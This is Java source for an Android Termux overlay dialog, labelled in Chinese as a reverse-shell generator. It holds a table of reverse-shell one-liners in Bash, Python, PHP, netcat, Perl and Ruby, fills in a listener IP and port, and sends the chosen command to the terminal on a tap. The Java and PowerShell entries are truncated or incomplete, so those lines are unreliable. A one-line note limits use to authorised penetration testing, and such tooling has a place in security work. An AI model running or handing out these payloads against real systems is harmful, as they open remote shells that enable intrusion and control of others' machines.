package com.termux.menu.ui.dialog;
import android.app.Dialog; import android.content.Context; import android.graphics.Color; import android.graphics.drawable.ColorDrawable;
import android.os.Build; import android.view.Gravity; import android.view.View; import android.view.ViewGroup; import android.view.Window; import android.view.WindowManager;
import android.widget.*; import com.termux.menu.R; import com.termux.menu.termux.TermuxCommandHelper;
public class ReverseShellDialog extends Dialog {
    private Context mCtx; private TermuxCommandHelper mCmd; private EditText mIp,mPort;
    private static final String[][] SHELLS={
            {"Bash","bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"},
            {"Python","python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"},
            {"PHP","php -r '$s=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
            {"NC","nc -e /bin/sh {IP} {PORT}"},
            {"Perl","perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
            {"Ruby","ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{IP}\",{PORT});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read};end'"},
            {"Java","Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtc..}|{base64,-d}|{bash,-i}\") 2>/dev/null"},
            {"PowerShell","powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{IP}\",{PORT})"},
    };
    public ReverseShellDialog(Context c){super(c,R.style.Theme_GavinFloat_Dialog);mCtx=c;mCmd=TermuxCommandHelper.getInstance(c);init();}
    private void init(){
        requestWindowFeature(Window.FEATURE_NO_TITLE);setCancelable(true);
        ScrollView sv=new ScrollView(mCtx);LinearLayout r=new LinearLayout(mCtx);
        r.setOrientation(LinearLayout.VERTICAL);r.setBackgroundColor(0xFF161823);r.setPadding(dp(16),dp(16),dp(16),dp(16));
        TextView t=new TextView(mCtx);t.setText("反弹Shell 生成器");t.setTextColor(0xFFFFFFFF);t.setTextSize(18);t.setTypeface(null,android.graphics.Typeface.BOLD);t.setPadding(0,0,0,dp(8));r.addView(t);
        TextView note=new TextView(mCtx);note.setText("注意：仅用于授权的渗透测试");note.setTextColor(0xFFFF9800);note.setTextSize(11);note.setPadding(0,0,0,dp(12));r.addView(note);
        r.addView(label("监听IP:"));
        mIp=new EditText(mCtx);mIp.setText("192.168.1.100");mIp.setTextColor(0xFFFFFFFF);mIp.setBackgroundColor(0x22FFFFFF);mIp.setPadding(dp(12),dp(8),dp(12),dp(8));mIp.setTextSize(14);r.addView(mIp);
        r.addView(label("监听端口:"));
        mPort=new EditText(mCtx);mPort.setText("4444");mPort.setTextColor(0xFFFFFFFF);mPort.setBackgroundColor(0x22FFFFFF);mPort.setPadding(dp(12),dp(8),dp(12),dp(8));mPort.setTextSize(14);r.addView(mPort);
        r.addView(label("选择类型(点击即复制到终端):"));
        for(final String[] s:SHELLS){
            LinearLayout card=new LinearLayout(mCtx);card.setPadding(dp(10),dp(8),dp(10),dp(8));card.setBackgroundColor(0xFF2A2A3A);card.setOrientation(LinearLayout.VERTICAL);
            LinearLayout.LayoutParams cp=new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ViewGroup.LayoutParams.WRAP_CONTENT);cp.bottomMargin=dp(4);card.setLayoutParams(cp);
            TextView name=new TextView(mCtx);name.setText(s[0]);name.setTextColor(0xFF48BAF3);name.setTextSize(14);card.addView(name);
            final String ip=mIp.getText().toString().trim(); final String port=mPort.getText().toString().trim();final String cmd=s[1].replace("{IP}",ip).replace("{PORT}",port);
            TextView code=new TextView(mCtx);code.setText(cmd);code.setTextColor(0xFF888888);code.setTextSize(10);code.setMaxLines(3);card.addView(code);
            card.setOnClickListener(new View.OnClickListener(){public void onClick(View view){
                mCmd.sendCommandToTerminal(cmd);Toast.makeText(mCtx,"已发送: "+s[0]+"shell",Toast.LENGTH_SHORT).show();dismiss();
            }});r.addView(card);
        }
        sv.addView(r);setContentView(sv);Window w=getWindow();if(w!=null){w.setGravity(Gravity.BOTTOM);w.setLayout(ViewGroup.LayoutParams.MATCH_PARENT,(int)(mCtx.getResources().getDisplayMetrics().heightPixels*0.8));w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O)w.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);else w.setType(WindowManager.LayoutParams.TYPE_PHONE);}
    }
    private TextView label(String t){TextView tv=new TextView(mCtx);tv.setText(t);tv.setTextColor(0xFFBBBBBB);tv.setTextSize(13);tv.setPadding(0,dp(10),0,dp(4));return tv;}
    private int dp(int v){return (int)(v*mCtx.getResources().getDisplayMetrics().density+0.5f);}
}
